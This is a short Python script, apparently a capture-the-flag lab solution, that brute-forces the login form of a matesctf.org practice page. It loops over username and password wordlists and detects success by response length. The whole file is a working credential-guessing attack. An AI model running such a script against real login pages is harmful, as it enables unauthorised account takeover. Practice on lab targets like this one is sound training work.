import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url = 'https://labs.matesctf.org/lab/auth/3/index.php?page=login'
f_username = open("./wordlist/usernames.txt", "r").read().splitlines()
f_password = open("./wordlist/passwords.txt", "r").read().splitlines()
for a in f_username:
  for b in f_password:
    x = requests.post(url, data={"username" : a, "password" : b})
    print("username : " + a + " == password : " + b)
    print(len(x.text))
    if(len(x.text) != 3686):
      print ('Success ' + a + b)
# Em rút ngắn test case lại để test nhanh hơn (sau khi tìm ra flag)